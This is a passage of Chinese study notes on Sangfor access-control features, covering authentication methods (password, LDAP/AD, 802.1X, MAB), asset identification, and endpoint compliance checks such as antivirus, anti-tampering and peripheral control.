style="zoom:67%;"><p>管理站（manager）：运行了可以执行网络管理软件的服务器</p><p>代理（agent）：代理在各个终端上，实现SNMP功能</p><p>通信通过：UDP</p><p>SNMP工作方式：get、set、trap</p><p>管理端：162端口代理端：161端口</p><p>版本：</p><ul><li>v1：初始版本</li><li>v2：实现密码功能</li><li>v3：增加认证和密文传输的支持</li></ul><h6 id="MIB库"><a href="#MIB库" class="headerlink" title="MIB库"></a>MIB库</h6><p>管理信息库MIB：任何一个被管理的资源都表示成一个对象，称为被管理的对象</p><p>每个OID(Object IDentification)都对应一个唯一的对象</p><img src="https://pic.imgdb.cn/item/673842b5d29ded1a8c71d7f1.png" style="zoom:67%;"><p>SNMP协议数据单元</p><img src="https://pic.imgdb.cn/item/6738431ad29ded1a8c726a8f.png" style="zoom:67%;"><ol start="2"><li>配置思路</li></ol><img src="https://pic.imgdb.cn/item/673843bad29ded1a8c7312ef.png" style="zoom: 50%;"><ol start="3"><li>思考总结</li></ol><p><img src="https://pic.imgdb.cn/item/67384431d29ded1a8c737ce3.png"></p><img src="https://pic.imgdb.cn/item/6738446fd29ded1a8c73ac15.png" style="zoom: 67%;"><img src="https://pic.imgdb.cn/item/673844a0d29ded1a8c73d0ea.png" style="zoom:67%;"><h6 id="错题-3"><a href="#错题-3" class="headerlink" title="错题"></a>错题</h6><p><img src="https://pic.imgdb.cn/item/673ea92fd29ded1a8c970f1d.png"></p><p>OAuth是一种开放标准,用于授权第三方应用程序安全地访问用户账户信息,而无需提供用户名和密码。它允许用户授权应用程序在不透露密码的情况下访问他们账户中的受保护资源,如网页、手机应用程序等。</p><p>OAuth认证主要涉及以下几个角色:</p><ol><li>资源所有者(Resource Owner)：拥有受保护资源的用户。</li><li>客户端(Client)：想要访问资源所有者资源的应用程序。</li><li>授权服务器(Authorization Server)：负责验证资源所有者的身份并颁发访问令牌的服务器。</li><li>资源服务器(Resource Server)：存放受保护资源的服务器,需要访问令牌才能访问资源。</li></ol><p>OAuth认证的主要流程如下:</p><ol><li>客户端请求用户授权</li><li>用户同意授权</li><li>客户端获取访问令牌</li><li>客户端使用访问令牌访问资源</li></ol><p>这样可以确保第三方应用程序不会获取到用户的密码,从而保护用户的账户安全。</p><p>Microsoft Authenticator 不属于密码认证的范畴,而是属于多因素认证(MFA)的一种形式。多因素认证是在传统密码认证的基础上增加了其他验证因素,提高了安全性。</p><p>Microsoft Authenticator 是一款 app,用于作为第二因素来验证用户身份。认证流程如下:</p><ol><li>用户输入用户名和密码进行初次认证。</li><li>系统会要求用户在 Microsoft Authenticator app 上确认登录请求。</li><li>用户打开 app,系统会验证用户的手机设备,如指纹、面部识别等,并允许用户确认登录。</li></ol><p>这样即使用户的密码被泄露,黑客也无法单独访问账户,因为还需要通过第二因素验证才能成功登录。</p><p><img src="https://pic.imgdb.cn/item/673ea956d29ded1a8c97318d.png"></p><p>B：根据源IP地址、计算机名、MAC地址来标识用户</p><h4 id="4-2-6-密码技术认证"><a href="#4-2-6-密码技术认证" class="headerlink" title="4.2.6 密码技术认证"></a>4.2.6 密码技术认证</h4><ol><li>需求背景</li></ol><p>需求：公共上网区则需要输入账号和密码才能上网，确保网络行为能跟踪到</p><p>​当用户首次上网时，会要求用户提交用户名密码信息，如果用户提交的用户名密码信息和本地(或第三方服务器)一致，则给予认证通过</p><p>​一般适用于对认证要求严格，希望上网日志记录具体的帐号，或希望和客户现有的第三方服务器结合认证的场景。</p><img src="https://pic.imgdb.cn/item/673845b9d29ded1a8c74bca7.png" style="zoom:67%;"><h5 id="HTTP协议（超文本传输协议）"><a href="#HTTP协议（超文本传输协议）" class="headerlink" title="HTTP协议（超文本传输协议）"></a>HTTP协议（超文本传输协议）</h5><p>​超文本：<u>包含有超链接(Link)和各种多媒体元素标记(Markup)的文本</u>。这些超文本文件彼此链接，形成网状(Web)，因此又被称为网页(WebPage)。这些链接使用URL表示。最常见的超文本格式是超文本标记语言HTML。</p><p>​URL：即统一资源定位符(Uniform Resource Locator)，用来唯一地标识万维网中的某一个文档。URL由协议、主机和端口(默认为80)以及文件名三部分构成。如:</p><p>​超文本传输协议：是一种按照URL指示，将超文本文档从一台主机(Web服务器)传输到另一台主机(浏览器)的应用层协议，以实现超链接的功能。</p><ol><li>HTTP工作原理</li></ol><img src="https://pic.imgdb.cn/item/67384d2ad29ded1a8c7b70f7.png" style="zoom: 50%;"><ol start="2"><li>HTTP请求方法</li></ol><p><img src="https://pic.imgdb.cn/item/67384e29d29ded1a8c7c402c.png"></p><ol start="3"><li>HTTP响应</li></ol><p>状态码：</p><img src="https://pic.imgdb.cn/item/67384e9ad29ded1a8c7c9baa.png" style="zoom: 67%;"><ol start="4"><li>HTTP头部</li></ol><p><img src="https://pic.imgdb.cn/item/67396430d29ded1a8c486cc1.png"></p><p>UA字段：</p><p><img src="https://pic.imgdb.cn/item/673965c8d29ded1a8c498000.png"></p><p>Server字段：</p><img src="https://pic.imgdb.cn/item/67396600d29ded1a8c49a3ff.png" style="zoom:67%;"><p>Referer字段：</p><img src="https://pic.imgdb.cn/item/67396650d29ded1a8c49dde1.png" style="zoom:67%;"><p>Location字段：</p><img src="https://pic.imgdb.cn/item/673966efd29ded1a8c4a41aa.png" style="zoom:67%;"><h5 id="密码认证流程"><a href="#密码认证流程" class="headerlink" title="密码认证流程"></a>密码认证流程</h5><ol><li>认证流程实现</li></ol><p><img src="https://pic.imgdb.cn/item/6739678dd29ded1a8c4aa54f.png"></p><h5 id="密码认证配置"><a href="#密码认证配置" class="headerlink" title="密码认证配置"></a>密码认证配置</h5><ol><li>配置思路</li></ol><img src="https://pic.imgdb.cn/item/6739691dd29ded1a8c4bb535.png" style="zoom:67%;"><ol start="2"><li>效果展示</li></ol><img src="https://pic.imgdb.cn/item/67396993d29ded1a8c4c0513.png" style="zoom:67%;"><ol start="3"><li>思考总结</li></ol><img src="https://pic.imgdb.cn/item/673969dbd29ded1a8c4c3260.png" style="zoom: 67%;"><img src="https://pic.imgdb.cn/item/67396ac5d29ded1a8c4cf742.png" style="zoom:67%;"><img src="https://pic.imgdb.cn/item/67396aecd29ded1a8c4d1acb.png" style="zoom:67%;"><ol start="4"><li>注意事项</li></ol><p><img src="https://pic.imgdb.cn/item/67396b89d29ded1a8c4d8d6c.png"></p><h4 id="4-2-7-外部认证技术"><a href="#4-2-7-外部认证技术" class="headerlink" title="4.2.7 外部认证技术"></a>4.2.7 外部认证技术</h4><ol><li>功能介绍</li></ol><p>​SANGFOR AC/SG的外部认证，也称为第三方认证。用户的账号密码信息保存在第三方服务器上，AC/SG将用户提交的用户名密码信息转给第三方认证服务器校验，通过第三方服务器返回的认证成功与否的信息，决定是否通过AC/SG的认证，这个过程称为AC/SG的外部认证。</p><p><img src="https://pic.imgdb.cn/item/67397f43d29ded1a8c5c980f.png"></p><ol start="2"><li>外部认证过程</li></ol><ul><li>PC向AC/SG提交用户名密码信息</li><li>AC/SG判断为外部认证，并把用户名密码信息发给外部认证服务器校验</li><li>外部认证服务器校验后，向AC/SG发送认证失败或成功的消息</li><li>AC/SG根据外部认证服务器返回的消息，确定是否让该PC通过认证。</li><li>PC通过认证后，就可直接访问公网了</li></ul><ol start="3"><li>外部认证条件</li></ol><p><img src="Ohttps://pic.imgdb.cn/item/673981add29ded1a8c5e5f79.png"></p><h5 id="外部认证配置"><a href="#外部认证配置" class="headerlink" title="外部认证配置"></a>外部认证配置</h5><ol><li>外部认证服务器配置</li></ol><p>（1）选择服务器类型（LDAP、Redius、POP3）</p><p>（2）选择服务器通信方式，IP，端口等</p><p><strong><u>POP3只支持单点登录，不支持外部认证</u></strong></p><h5 id="LDAP认证配置"><a href="#LDAP认证配置" class="headerlink" title="LDAP认证配置"></a>LDAP认证配置</h5><ol><li>LDAP简介</li></ol><ul><li>目录服务</li></ul><p>​目录是一个为查询、浏览和搜索而优化的数据库，它以<strong>树状结构</strong>来组织数据，类似文件目录。目录数据库与关系型数据库不同，他有优异的<strong>读性能</strong>，但是写性能较差，并且没有事务处理、回滚等机制，不适用于频繁修改的数据，适用于<strong>快速响应和大文件查询</strong>，</p><ul><li>LDAP概念</li></ul><p>​LDAP(Lightweight Directory Access Protocol)是基于X.500标准的<strong>轻量目录访问协议</strong>，其实是一种目录服务，类似于我们所使用诸如NlS(Network Information Service)、DNS(Domain NameService)等网络目录，<u>LDAP数据库是一种特殊的数据库</u>，对查询进行了优化。</p><p>​目录服务数据库是成<strong>树状结构</strong>组织数据，类似文件目录一样。</p><ol start="2"><li>LDAP、AD和域控的联系</li></ol><p>（1）LDAP （Lightweight Directory Access Protocol）是一种<strong>目录服务协议</strong>，用于访问和管理目录信息。它是一种通用的、跨平台的协议。</p><p>（2）AD （Active Directory）是Microsoft开发的<strong>目录服务产品</strong>，基于LDAP协议进行工作。AD使用LDAP作为目录访问的标准协议。</p><p>（3）域控制器（Domain Controller）是AD基础架构中的<strong>核心组件</strong>。域控制器负责验证用户身份、管理用户帐户、组织资源访问权限等。<u>域控制器通过LDAP协议与客户端进行通信</u>。</p><p>（4）在AD中，域控制器存储着用户、计算机、组等目录信息。这些信息通过LDAP协议提供给各个客户端应用程序访问和管理。</p><p>（5）域控制器还负责同步域中的目录信息，确保各个域控制器上的数据一致性。这种同步机制依赖于LDAP协议进行数据传输。</p><p>​<u>LDAP是目录服务的通用协议标准,AD则是基于LDAP构建的一个完整的目录服务解决方案,域控制器是AD架构中的核心组件,负责管理和维护整个目录系统。三者之间存在密切的技术联系。</u></p><ol start="3"><li>LDAP特点</li></ol><ul><li>跨平台，标准的协议</li><li>安全的协议     v3版本：使用SA、SL、SSL、TLS</li><li>提供了访问控制</li><li>支持异类数据存储</li><li>部署安装简单，易于维护</li></ul><ol start="4"><li>LDAP术语</li></ol><p><img src="https://pic.imgdb.cn/item/673987c8d29ded1a8c6379e3.png"></p><ol start="5"><li>LDAP场景</li></ol><p>​LDAP具有的查询效率高、树状的信息管理模式、分布式的部署框架以及灵活而细腻的访问控制，使LDAP广泛地应用于基础性、关键性信息的管理，如用户信息、网络资源信息等。</p><ol start="6"><li>LDAP产品</li></ol><p><img src="https://pic.imgdb.cn/item/67398857d29ded1a8c63edce.png"></p><ol start="7"><li>LDAP认证案例</li></ol><p><img src="https://pic.imgdb.cn/item/673988b1d29ded1a8c643934.png"></p><p>（1）新建外部认证服务器，设置AD域服务器信息。</p><p>（2）新建认证策略，选择“密码认证”认证服务器选择上面创建好的服务器。</p><p>配置步骤：</p><p><img src="https://pic.imgdb.cn/item/673989c5d29ded1a8c651377.png"></p><p><img src="https://pic.imgdb.cn/item/673989f1d29ded1a8c653a44.png"></p><p><img src="https://pic.imgdb.cn/item/67398a20d29ded1a8c656264.png"></p><img src="https://pic.imgdb.cn/item/67398ae3d29ded1a8c66067d.png" style="zoom:67%;"><img src="https://pic.imgdb.cn/item/67398b5bd29ded1a8c666814.png" style="zoom:67%;"><h6 id="错题-4"><a href="#错题-4" class="headerlink" title="错题"></a>错题</h6><p><img src="https://pic.imgdb.cn/item/673eb6d4d29ded1a8ca55531.png"></p><h4 id="4-2-8-802-1x认证"><a href="#4-2-8-802-1x认证" class="headerlink" title="4.2.8 802.1x认证"></a>4.2.8 802.1x认证</h4><ol><li>案例背景</li></ol><p>要求实现：</p><p>1、公共上网区终端未认证前不能访问服务器区和办公区任何资源。且需要输入账号和密码才能上网，确保网络行为能跟踪到。<br>2、办公区终端也需要认证后才能访问内网打印机资源。<br>3、摄像头、打印机等设备免认证入网。</p><img src="https://pic.imgdb.cn/item/673e83c8d29ded1a8c732b34.png" style="zoom:67%;"><p>需求分析：</p><p><img src="https://pic.imgdb.cn/item/673e8415d29ded1a8c735429.png"></p><ol start="2"><li>802.1X需求背景</li></ol><p>​公司内外存在各种各样的终端设备(员工终端、访客终端、哑终端、IOT终端等)，AC一般放在出口位置，<u>只能对访问外网的用户做认证和管控</u>，内网这些终端设备无法管控，没有经过可信认证就可随意接入内网，我们全网行为管理<strong>新增802.1x功能</strong>即是在这种背景下产生<strong>结合终端管控和外设管控</strong>等功能，一起补齐AC在内网安全这块的短板。</p><ol start="3"><li>802.1X应用场景</li></ol><ul><li>已经做了出口边界的管理，但是缺少内部接入入口的管理，需要确保不可信、不合规的终端不能接入网络</li><li>认证通过根据用户属性自动划分VLAN，细化用户访问权限</li><li>内网存在哑终端，绑定信息可自动放行</li></ul><ol start="4"><li>802.1X认证与portal认证的对比</li></ol><p><img src="https://pic.imgdb.cn/item/673e8601d29ded1a8c747144.png"></p><h5 id="802-1X协议介绍"><a href="#802-1X协议介绍" class="headerlink" title="802.1X协议介绍"></a>802.1X协议介绍</h5><p>​802.1X认证：又称为<strong>EAPOE</strong>(Extensible Authentication Protoco Over Ethernet)认证，主要目的是为了解决局域网用户接入认证问题。802.1X认证中用到了RADIUS协议[^3]认证方式，典型的C/S结构</p><p>认证模式:</p><ul><li>基于接口：该模式下只要连接到端口的某个设备通过认证，该<u>端口下得其他设备则不需要通过认证</u>，就可以访问网络资源</li><li>基于MAC：该模式下连接到同一端口的每个设备都需要单独进行认证，一台终端通过认证之后交换机<u>只对该MAC地址放通认证，同个端口下其它终端均需要</u>。</li></ul><p>认证方式：EAP终结[^4]、EAP透传(中继)[^5]</p><p><strong>注意：AC是用EAP透传的方式</strong></p><ol><li>802.1X认证流程</li></ol><p>​以有线PC终端802.1x认证为例，说明整个802.1x</p><p>认证流程:</p><p>第一步:客户端发起开始认证请求。</p><p>第二步:交换机收到请求之后，要求客户端提交用户信息。</p><p>第三步:客户端会提交用户账号密码信息给到交换机</p><p>第四步:交换机收到用户信息之后，将数据封装成RADIUS报文发送到AC。</p><p>第五步:AC完成校验，如果检验成功通过认证，发送认证成功报文给到交换机，交换机然后放通端口，如果检验失败，发送认证失败报文给交换机，交换机不放通端口</p><img src="https://pic.imgdb.cn/item/673e8a4cd29ded1a8c77420f.png" style="zoom:67%;"><ul><li>PC将发出请求认证(EAPOL-Start报文)的报文给交换机</li><li>交换机收到请求认证的数据帧后，将发出一个请求帧(EAP-Request/ldentity报文)要求用户的PC发送输入的用户名。</li><li>PC响应交换机发出的请求，将用户名信息通过数据帧(EAP-Response/ldentity报文)发送给交换机<br>  交换机将PC发送的数据帧经处理后(RADIUS Access-Request报文)发给AC</li><li>AC收到用户名信息后，找到该用户名对应的密码信息，用随机生成的一个加密字对它进行加密处理，<br>  同时也将此加密字通过RADIUS Access-Challenge报文发送给交换机，由交换机转发给客户端程序</li><li>PC收到由交换机传来的加密字(EAP-Request/MD5 Challenge报文)后，用该加密字对密码部分进行加密处理(此种加密算法通常是不可逆的)，生成EAP-Response/MD5 Challenge报文，并通过交换机传给AC。</li><li>AC将收到的已加密的密码信息(RADIUS Access Request报文)和本地经过加密运算后的密码信息进行对比，如果相同，则认为该用户为合法用户，反馈认证通过的消息(RADIUS Access-Accept报文和EAP-Success报文)</li><li>设备收到认证通过消息后将端口改为授权状态，允许用户通过端口访问网络并通知PC认证成功。</li></ul><p><img src="https://pic.imgdb.cn/item/673e8b7fd29ded1a8c7800d8.png"></p><ol start="2"><li>802.1X上线流程</li></ol><p>认证成功之后交换机放通了端口，终端获取到IP后可以正常去上网，但是终端未在AC设备上线，AC需要收到计费开始请求或者收到流量之后才开始走上线流程:</p><ul><li>认证成功后，AC将终端MAC地址缓存在设备内存中5分钟</li><li>AC需要获取IP/MAC对应关系完成上线，三种上线方式<ul><li>计费报文带IP</li><li>通过流量方式(二层环境终端上网数据过AC)或者镜像方式获取DHCP，ARP广播报文</li><li>跨三层取MAC的方式+计费报文，</li></ul></li></ul><p>注意：<u>若没有计费报文的情况，PC注销后交换机不会通知AC下线，会存在用户无法注销的情况。</u></p><ol start="3"><li>802.1X认证配置步骤（**<u>认证端口 UDP 1812</u>**）</li></ol><img src="https://pic.imgdb.cn/item/673e8e07d29ded1a8c79a791.png" style="zoom: 50%;"><img src="https://pic.imgdb.cn/item/673e8e5cd29ded1a8c79e053.png" style="zoom:50%;"><img src="https://pic.imgdb.cn/item/673e8e89d29ded1a8c79fd2c.png" style="zoom:50%;"><img src="https://pic.imgdb.cn/item/673e8ea8d29ded1a8c7a10ec.png" style="zoom:50%;"><h5 id="MAB免认证"><a href="#MAB免认证" class="headerlink" title="MAB免认证"></a>MAB免认证</h5><p>定义：MAB认证，全称为MAC旁路认证(MAC Authentication Bypass)，MAB是一种基于接口和终端MAC地址对用户的访问权限进行控制的认证方法，在此类认证方式中，不需要给用户分配账号密码，由接入设备使用接入设备的mac地址作为用户名、密码自动做认证(也可以使用其他方式，但是都不需要用户输入账号信息)。</p><p>场景：<strong>适用于不能或者不想做802.1X认证</strong>，只想通过mac地址作为准入依据的用户，常见用于<strong>打印机，指纹机，摄像头，IP电话</strong>等<strong>哑终端</strong>[^6]，也可用于pc，此时终端不需要主动做认证，无感知免认证入网，需要在AC上维护mac地址数据库。</p><ol><li>MAB认证流程</li></ol><p>​以有打印机终端802.1x认证为例，说明整个mab认证流程：</p><ul><li>第一步:交换机在30s超时时间内未收到客户端发起的认证请求，开始MAB认证流程。</li><li>第二步:交换机通过ARP等报文学习到终端的MAC地址，</li><li>第三步:交换机把终端的<strong>MAC地址</strong>当作<strong>用户名和密码</strong>封装在radius报文中发送给AC。</li><li>第四步:AC完成校验，如果检验成功通过认证，发送认证成功报文给到交换机，交换机然后放通端口，如果检验失败，发送认证失败报文给交换机，交换机不放通端口</li></ul><img src="https://pic.imgdb.cn/item/673e9022d29ded1a8c7b0359.png" style="zoom: 67%;"><ol start="2"><li>MAB配置步骤</li></ol><p><img src="https://pic.imgdb.cn/item/673e90e4d29ded1a8c7b8168.png"></p><ol start="3"><li>注意事项</li></ol><ul><li>MAB认证属于802.1X认证的一种，802.1X的免认证通过<strong>MAC认证</strong>来实现，同样需要联动交换机配置。</li><li>配置802.1X认证，用户源只能是AC本地用户或者AD域用户</li><li>802.1x认证有基于端口和基于MAC，建议客户交换机配置为<strong>基于MAC</strong>，安全性更高</li><li>802.1x认证有<strong>EAP中继</strong>和<strong>EAP终结</strong>方式，我们AC的802.1x是<strong>EAP中继</strong>方式</li><li>使用认证助手功能时需要在控制台勾选开启准入认证客户端802.1x功能选项，安装完准入插件后会在桌面生成认证助手快捷方式。</li></ul><h4 id="4-2-9-终端识别和管理概述"><a href="#4-2-9-终端识别和管理概述" class="headerlink" title="4.2.9 终端识别和管理概述"></a>4.2.9 终端识别和管理概述</h4><ol><li>终端识别和管理需求背景</li></ol><ul><li>管理员无法感知内网资产，包括终端、服务器、网络设备的情况，未知设备的存在并不受管控的状态对内网安全形成风险</li><li>无法感知IP使用情况，造成IP资源的浪费同时引起管理运维上的困难</li></ul><p><img src="https://pic.imgdb.cn/item/673e939dd29ded1a8c7d57df.png"></p><ol start="2"><li>终端识别技术</li></ol><p>（1）资产识别技术</p><p>​企业单位内网资产管理混乱，大量终端类型无法识别，通过对tcp/dhcp/arp/http/dicom等协议流量的分析以及NMAP主动扫描结合深信服终端识别指纹库实现资产精准识别。识别终端类型、操作系统、厂商信息等并自动<br>分类。</p><p><img src="https://pic.imgdb.cn/item/673e96cfd29ded1a8c824df1.png"></p><p>资产资产识别分为三步:</p><p>一、通过<strong>被动抓取</strong>或<strong>主动扫描</strong>等方式收集到终端流量里面的各种属性字段。</p><p>二、把收集到的字段交给指纹库对终端类型进行识别获取终端类型。</p><p>三、将获取到的终端类型信息存储到数据库中用于被调用展示;同时将其下发到驱动里，从而实现访问权限策略模块可以根据不同的终端类型进行不同的策略控制。</p><p>配置思路：</p><p>1、AC上开启被动扫描，设置内网网段。只能识别经过AC的流量。<br>2、AC上开启主动扫描，设置重点关注网段，会主动发起扫描内网设备，跨三层需要开启snmp。等待扫描结果，对扫描出来的资产进行个性化编辑。</p><p>配置步骤：</p><p><img src="https://pic.imgdb.cn/item/673e9d2cd29ded1a8c894f78.png"></p><p>注意事项：</p><p>1、开启主动扫描功能需注意可能会被内网其它安全设备检测并告警拦截。</p><p>2、终端主动扫描的IP数量最大支持20w。</p><p>3、资产列表优先以mac地址来确认一条资产，若要提高资产识别的准确性建议开启snmp跨三层确mac地址。</p><h4 id="4-2-10-终端检查和管控技术"><a href="#4-2-10-终端检查和管控技术" class="headerlink" title="4.2.10 终端检查和管控技术"></a>4.2.10 终端检查和管控技术</h4><h5 id="杀软检查与登录域检查"><a href="#杀软检查与登录域检查" class="headerlink" title="杀软检查与登录域检查"></a>杀软检查与登录域检查</h5><ol><li>杀软检查需求案例</li></ol><p><img src="https://pic.imgdb.cn/item/673ebe89d29ded1a8cad2baf.png"></p><ol start="2"><li>杀软检查需求案例</li></ol><ul><li>准入插件检查杀软是否运行(通过插件读取终端<strong>注册表信息</strong>获取软件安装信息)</li><li>插件准入规则支持检测EDR、360、金山毒霸等22款杀软有无运行，也支持杀软版本号检测。未检测到软件安装则判定为违规。违规动作:<ul><li>支持禁止上网并提示用户，提示用户，只记录结果，违规修复和限制用户权限五种违规处理<br>  方式。<br>  1、禁止上网并提示用户：通过重定向浏览器http/https上网流量来阻断上网，并在右下角<br>  提示用户。<br>  2、提示用户：在终端右下角弹出提示信息。<br>  3、只记录结果：只在日志中记录违规行为日志并不给予其它动作。<br>  4、违规修复：向终端下发并运行指定的安装程序或者重定向http/https流量<br>  5、限制用户权限：支持选择违规后匹配【访问权限策略】和【用户限额策略】两种策略</li></ul></li></ul><ol start="3"><li>杀软检查配置思路</li></ol><p><img src="https://pic.imgdb.cn/item/673ec334d29ded1a8cb0ce26.png"></p><ol start="4"><li>杀软检查功能说明-流量实现方式</li></ol><ul><li>通过流量检查杀软是否运行，<strong>不需安装准入插件</strong>:</li><li>支持8种个人版杀软检查和4种企业版杀软(个人版杀软流量特征已定义，通过检查终端的流量特征来确定是否安装个人版杀软;企业版杀软需要指定中心端地址，通过检查终端和中心端是否有流量来判断是否安装企业版杀软)。在指定事件内未检测到对应流量则判定为违规。</li><li>对于违规动作的操作:<ul><li>定期重定向至指定网址修复:每隔设定的间隔时间对http/https流量进行重定向到指定安装页面。</li><li>只记录结果:只在日志中记录违规行为日志并不给予其它动作。</li><li>注意:使用企业版杀软检查的情况下，终端与杀软中心端服务器之间的流量包需要经过AC。</li></ul></li></ul><ol start="5"><li>注意事项</li></ol><p>（1）杀毒软件的版本号需要看操作系统-控制面板\程序\程序和功能处的版本信息，金山毒霸只支持最新版本号(金山毒霸版本号11.2019.4.9.121300.1335)</p><p>（2）流量杀软检查违规处置，默认针对所有终端类型生效;可通过修改后台配置仅针对windowsPC终端生效，若要修改，非原厂工程师联系400售后支持。</p><p>（3）流量方式判断企业版杀软，违规判定条件要根据企业版杀软配置的更新频率来EDR默认心跳是1分钟，建议配置为5分钟，其他企业杀软可根据配置，也可通过终端抓包来确定时间交互时间，建议配置的时间大于实际交互时间。</p><p>（4）流量杀软检查最多只检查<strong>10W</strong>在线用户是否违规</p><p>（5）两种杀软检查方式，用户<strong>必须在线</strong>之后才能获取到下发的策略</p><p>思考</p><p><img src="https://pic.imgdb.cn/item/6743dac488c538a9b5bb80c4.png"></p><ol><li>登录域检查需求案例</li></ol><p>​AD的全称是Active Directory:活动目录，是企业常用的一种管理架构，PC加入域之后，在域内均能进行身份验证，管理人员可以较好的管理计算机资源。</p><p>​但是企业内网的PC往往因为各种原因未加入域，需要检测终端是否加域，不加域则不允许上网。</p><ol start="2"><li>登录域检查概述</li></ol><ul><li>支持登录域检测和登录指定域检测:<br>  1、登录域检测：PC以任意域账号登录即可检测合规。<br>  2、登录指定域：PC必须以域账号登录到指定域中的一个即可检测到合规，登录非指定域无效。</li><li>违规动作，支持禁止上网，提示用户，只记录结果和限制用户权限四种违规处理方式。<br>  1、禁止上网并提示用户：通过重定向浏览器http/https上网流量来阻断上网，并在右下角提示用户。<br>  2、提示用户：在终端右下角弹出提示信息。<br>  3、只记录结果：只在日志中记录违规行为日志并不给予其它动作。<br>  4、限制用户权限：支持选择违规后匹配【访问权限策略】和【用户限额策略】两种策略。</li></ul><ol start="3"><li>注意事项</li></ol><ul><li>使用限制用户权限功能需要事先定义好访问权限策略/用户限额策略</li><li>用户必须在线之后且己安装插件才能获取到下发的策略，</li><li>windows server多用户模式下“提示用户”功能无法对所有用户生效，只能生效一个</li></ul><h5 id="放篡改检查与外联检查"><a href="#放篡改检查与外联检查" class="headerlink" title="放篡改检查与外联检查"></a>放篡改检查与外联检查</h5><ol><li>防篡改检测需求案例</li></ol><p>​企业出于商业机密和自主知识产权保护，需防止非法仿冒合法终端MAC/IP地址绕过认证入网造成安全隐患以及避免IP地址冲突导致运维管理繁琐，若<strong>有违规则恢复篡改前地址</strong></p><ol start="2"><li>防篡改检查概述</li></ol><ul><li>防篡改检查<ul><li>MAC防篡改：通过插件先获取当前系统识别的网卡MAC地址信息，再通过调取系统底层文件IO接口获取设备接口真实物理MAC地址，进行比对，一致则继续检测下一个网卡，若违规动作选择了修复，则会删除注册表对应网卡的NetworkAddresskey恢复真实MAC地址</li><li>IP防篡改：插件启动后会把当前所有网卡的IP信息记录下来，每40s检测一次网卡ip信息，与记录的ip信息不一致则认证ip被篡改，判定违规</li></ul></li><li>违规动作:<ul><li>IP地址篡改检测：检测违规后恢复修改前地址并提示用户</li><li>MAC地址篡改检测，支持【禁止上网并提示用户】、【恢复修改前地址并提示用户】、【提示用户】【只记录结果】四种违规处理方式。</li><li>支持同时检测IP地址与MAC地址篡改，检测违规后恢复修改前地址并提示用户。</li></ul></li></ul><ol start="3"><li>非法外联检测需求案例</li></ol><p>​企业专网场景需要检测内网络端非法访问其它网络的行为，若有违规则禁止其访问网络，防止泄密。</p><ol start="4"><li>外联检查</li></ol><ul><li>拨号行为:通过检查系统API接口或者函数判断拨号行为</li><li>网卡相关:通过检测相关API接口或函数和注册表相关信息来检测有无线网卡，有4G网卡和双网卡行为</li><li>连接外网:检测以下几个网站是否能ping通，如果可以则认为是可以连接外网<a href="http://www.taobao.com、www.jd.com、www.baidu.com、www.sangfor.com、www.ifeng.com/">www.taobao.com、www.jd.com、www.baidu.com、www.sangfor.com、www.ifeng.com</a></li><li>连接非法WIF1:通过检查系统的API接口或函数获取SSID信息，然后和白名单中设置的SSID作对比</li><li>连接非法网关:通过检查系统的API接口或函数获取所有物理网卡的网关，然后和白名单中设置的地址作比对</li><li>自定义外联:可设置IP/域名和端口，准入客户端去检测是否<br>  可以访问</li><li><strong>违规动作:可选发送告警邮件或直接禁用网卡</strong></li></ul><ol start="5"><li>注意事项</li></ol><ul><li>防篡改检查策略需要安装准入客户端。（只在<strong>Windows客户端</strong>生效）</li><li>选择不能修改IP行为检查项时违规操作<strong>只支持选择恢复修改前地址并提示用户</strong>。</li><li>用户必须在线之后才能获取到下发的策略。</li><li>外接网卡地址和虚拟机地址暂不支持防篡改检查。</li></ul><h5 id="外联控制与外设管控技术"><a href="#外联控制与外设管控技术" class="headerlink" title="外联控制与外设管控技术"></a>外联控制与外设管控技术</h5><ol><li>外联控制需求案例</li></ol><p>​企业专网场景需要从端上实现控制访问权限，如只允许访问某个IP或者访问某个IP范围。</p><ol start="2"><li>外联控制</li></ol><ul><li>Windows系统使用微软WEP(Windows Filtering Platform)框架中的防火墙API来实现微隔离功能(XP系统电脑<br>  不支持管控，xp没有WFP框架)</li><li>支持黑白名单的方式，支持IP和端口，端口为空是默认1-65535端口。</li></ul><p><img src="https://pic.imgdb.cn/item/6743e16288c538a9b5bb82e3.png"></p><ol start="3"><li>外设控制需求案例</li></ol><p>​企业为了防范病毒通过外设传播以及资料外泄的风险，需要对内网终络端接入的外设设备进行管控，不允许接入U盘拷贝资料。</p><ol start="4"><li>外设管控</li></ol><ul><li>外设管控可分为两种管控方式：<strong>组策略管控</strong>、<strong>精细化管控</strong><br>  1、组策略管控：通过使用组策略来<strong>禁止外设设备安装驱动</strong>，从而达到管控外设的目的(无组策略的系统不支持，如家庭版)，<br>  2、精细化管控：调用系统的设备管理器和进程注入的方式来实现U盘和便携设备的精细化管控(只支持win7及以上操作系统，不区分是否家庭版)。<br>  U盘精细化管控：<br>  1.拒绝 2.可读 3.可读写 4.告警(需要启用设备的事件告警功能)<br>  便携设备精细化管控<br>  1.允许 2.禁用 3.告警(需要启用设备的事件告警功能)</li></ul><p><img src="https://pic.imgdb.cn/item/6743e36888c538a9b5bb838c.png"></p><ol start="5"><li>外设管控白名单</li></ol><ul><li>白名单需要填入外设设备的硬件ID，可下载设备ID获取指南，里面有工具可以获取硬件ID</li><li>硬件ID由每个设备的硬件ID和电脑的父系组成，因为父系不一样，默认每个外设设备在每台电脑上的硬件ID都不一样</li><li>历史存储设备快捷导入功能只对U盘及移动硬盘生效其他例如网络设备、蓝牙设备等不支持快捷导入，需要使用工具</li><li>工具使用方法可从设备ID获取指南得到。</li></ul><ol start="6"><li>注意事项</li></ol><p>（1）需要用户先通过认证之后才能下发终端检查和管控策略</p><p>（2）PC到全网设备的路径中不能存在NAT，如果存在NAT终端策略功能不生效</p><p>（3）组合规则不适用外联检查和控制规则</p><p>（4）使用组策略方式禁用存储设备，如果电脑存在除系统盘之外的第二块非usb口的内置硬盘，也会禁用掉，如果需要放开要加白名单</p><p>（5）外设管控策略中如果终端正在使用外设设备，这时下发外设管控策略也能禁止正在使用的外设，下发策略的总白名单ID条数限制为1024</p><p>（6）组策略禁止方式不支持windows系列所有家庭版操作系统和xp系统也包括加入域的PC也不支持外设管控。</p><p>（7）使用组策略禁用的外设重新放开时可能需要重新插拔一下安装驱动或者手动安装驱动;使用精细化管控禁用的设备重新放开无需重新插拔一下安装驱动或者手动安装驱动，重新放开需要更新策略一般是40s</p><p>（8）组策略目前发现和360天擎不兼容，装有天擎的环境外设管控不建议使用组策略方式。</p><h4 id="4-2-11应用特征识别技术"><a href="#4-2-11应用特征识别技术" class="headerlink" 